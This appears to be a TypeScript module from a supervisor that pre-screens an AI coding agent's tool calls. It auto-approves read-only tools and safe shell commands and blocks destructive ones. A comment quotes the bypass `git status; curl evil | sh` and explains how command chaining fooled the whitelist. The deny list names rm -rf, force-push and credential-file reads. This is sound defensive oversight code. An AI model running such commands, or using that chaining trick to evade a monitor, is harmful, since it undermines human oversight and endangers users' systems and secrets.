/**
 * Deterministic pre-classification tier — decide the obvious cases WITHOUT calling a model.
 *
 * Ported from the Python supervisor (`tiers.py`. The orchestrator calls `preClassify` before loading
 * BDI knowledge or invoking the classifier:
 *  - GREEN → a read-only / safe non-mutating action: auto-approve it (and post a green update).
 *  - RED   → an unambiguously destructive/irreversible action: raise an interactive block.
 *  - null  → ambiguous: run the full classifier.
 *
 * Every action still flows through the supervisor (so every action is recorded and, when a
 * channel is configured, reported); the tier just avoids paying for a model call on the
 * obvious cases.
 */

import { AssessmentInput, TrafficLight } from './models';
import { NormalizedSession, originalRequest } from './transcript';

/**
 * Tools that are safe to auto-approve without a model call. Almost all of them only read, but
 * `TodoWrite` writes — to Claude's own scratch todo list, which is why the set is named for what
 * it means (safe) rather than for what most of it does. Both naming schemes appear in practice:
 * IBM Bob's snake_case tools and Claude Code's capitalised ones. Matched exactly and
 * case-sensitively, so Claude's mutating `Write` can never be mistaken for a read.
 *
 * Claude's `WebFetch` and `WebSearch` are deliberately absent. They mutate nothing, but they aim
 * outside the machine — what they send, and to whom, is exactly the kind of judgment the
 * classifier exists to make.
 */
const SAFE_TOOLS: ReadonlySet<string> = new Set([
  'read_file', 'list_files', 'search_files', 'list_code_definition_names',
  'glob', 'grep', 'codebase_search',
  'Read', 'Glob', 'Grep', 'NotebookRead', 'TodoWrite', 'BashOutput',
]);

/** The shell tools, whose command argument decides the answer. Both call the argument `command`. */
export const SHELL_TOOLS: ReadonlySet<string> = new Set(['execute_command', 'Bash']);

/**
 * Shell syntax that lets one command line run more than the command it starts with: separators and
 * chains, pipes, both substitution forms, redirects, and a background `&`.
 *
 * This exists because `SAFE_COMMAND` below is anchored at the start of the string, so by itself it
 * only ever described a command's FIRST word — `git status; curl evil | sh` matched `git status`
 * and came back GREEN, auto-approved with no model call. Deciding which of these characters are
 * really separators and which are quoted needs a shell parser, and a wrong guess here approves
 * arbitrary code, so a command containing any of them is simply not eligible for the free path. It
 * still reaches the classifier; it just does not skip it.
 */
const SHELL_COMPOSITION = /[;&|`\n\r><]|\$\(/;

/**
 * Safe, non-mutating shell commands (matched against the `command` argument). Anchored at the
 * start, and only meaningful together with the `SHELL_COMPOSITION` check above — on its own it
 * says nothing about the rest of the line.
 */
const SAFE_COMMAND =
  /^\s*(ls|cat|pwd|echo|head|tail|wc|grep|rg|find|which|env|date|whoami|git\s+(status|log|diff|show|branch|remote|rev-parse|config\s+--get))\b/i;

// These hard-coded destructive patterns mirror the team BDI reds (protected-branch push,
// force-push, rm -rf, secret access, prod/permission changes). Upgrade path: derive them from
// BDI intentions with level=red instead of a static table.
// Only UNAMBIGUOUSLY destructive/irreversible actions belong here. Ambiguous cases (e.g. a
// plain `git push origin main`, whose risk depends on branch protection) are left to the model
// + BDI — the deterministic tier must not pre-empt that judgment.
const DESTRUCTIVE: RegExp[] = [
  /\bgit\s+push\b.*\s(--force|-f|--force-with-lease)\b/i,
  /\bforce[- ]?push\b/i,
  /\bgit\s+push\b.*\s(--delete|:refs\/)/i,        // deleting remote refs
  /\brm\s+-[a-z]*r[a-z]*f|\brm\s+-[a-z]*f[a-z]*r/i, // rm -rf / -fr
  /\b(drop|truncate)\s+(table|database)\b/i,
  /\bchmod\s+(-R\s+)?0?777\b/i,
  /(^|[\s/="'])(\.env|id_rsa|id_ed25519|credentials|\.pem)($|[\s"'])/i,
];

const DESTRUCTIVE_LABEL = 'destructive/irreversible action matched a deterministic red rule';

/** Everything the deterministic rules should scan: pending tool name + args + description. */
function haystack(session: NormalizedSession): string {
  const p = session.pendingAction;
  if (p === null) { return ''; }
  const args = p.arguments ? JSON.stringify(p.arguments) : '';
  return `${p.name ?? ''} ${p.description ?? ''} ${args}`;
}

function isSafeRead(session: NormalizedSession): boolean {
  const p = session.pendingAction;
  if (p === null) { return false; }
  const name = (p.name ?? '').trim();
  if (SAFE_TOOLS.has(name)) { return true; }
  if (SHELL_TOOLS.has(name)) {
    const cmd = p.arguments ? String(p.arguments.command ?? '') : '';
    // Both halves are required: the line must start with something safe AND be a single command.
    return SAFE_COMMAND.test(cmd) && !SHELL_COMPOSITION.test(cmd);
  }
  return false;
}

/**
 * RED for destructive, GREEN for read-only/safe, else null (→ run the classifier).
 * RED is checked first so a destructive command never slips through as 'safe'.
 */
export function preClassify(session: NormalizedSession): TrafficLight | null {
  const hay = haystack(session);
  if (!hay.trim()) { return null; }
  for (const pat of DESTRUCTIVE) {
    if (pat.test(hay)) { return TrafficLight.RED; }
  }
  if (isSafeRead(session)) { return TrafficLight.GREEN; }
  return null;
}

/** A label for the pending action, used in messages and blocked-action lists. */
export function actionLabel(session: NormalizedSession): string {
  const p = session.pendingAction;
  if (p === null) { return 'the requested action'; }
  if (p.arguments && p.arguments.command) {
    return `${p.name ?? 'command'}: ${String(p.arguments.command)}`;
  }
  return p.name || 'the requested action';
}

/** A minimal, schema-valid RED assessment for the deterministic path (no model call). */
export function redAssessment(session: NormalizedSession): AssessmentInput {
  const p = session.pendingAction;
  const action = (p ? (p.name || 'the requested action') : 'the requested action');
  return {
    traffic_light: TrafficLight.RED,
    confidence: 1.0,
    summary: `Deterministic block: ${DESTRUCTIVE_LABEL}.`,
    agent_intent: (p && p.description ? p.description : action),
    user_intent: originalRequest(session) || '(unknown)',
    waiting_reason: session.waitingReason || 'awaiting approval',
    issues: [
      {
        description: `${action} matched a deterministic destructive-action rule.`,
        severity: 'critical',
        reasoning: 'Blocked by the deterministic tier before any model call.',
        evidence_from_session: [],
        relevant_knowledge: [],
      },
    ],
    recommended_action: 'Block; require an explicit human unblock.',
    supervisor_message_to_agent: null,
    human_notification: `Blocked a destructive action (${action}). No approval was given.`,
    human_options: [],
    allowed_actions_while_waiting: [],
    blocked_actions: [action],
    should_block_agent: true,
    should_block_original_action: true,
    transitioned_from: null,
    transition_reason: null,
  };
}

/** A minimal, schema-valid GREEN assessment for the deterministic auto-approve path. */
export function greenAssessment(session: NormalizedSession): AssessmentInput {
  const p = session.pendingAction;
  const action = actionLabel(session);
  return {
    traffic_light: TrafficLight.GREEN,
    confidence: 1.0,
    summary: `Auto-approved (read-only/safe): ${action}.`,
    agent_intent: (p && p.description ? p.description : action),
    user_intent: originalRequest(session) || '(unknown)',
    waiting_reason: session.waitingReason || 'awaiting approval',
    issues: [],
    recommended_action: 'Approve; the action is read-only or non-mutating.',
    supervisor_message_to_agent: null,
    human_notification: `Auto-approved a safe action: ${action}.`,
    human_options: [],
    allowed_actions_while_waiting: [],
    blocked_actions: [],
    should_block_agent: false,
    should_block_original_action: false,
    transitioned_from: null,
    transition_reason: null,
  };
}
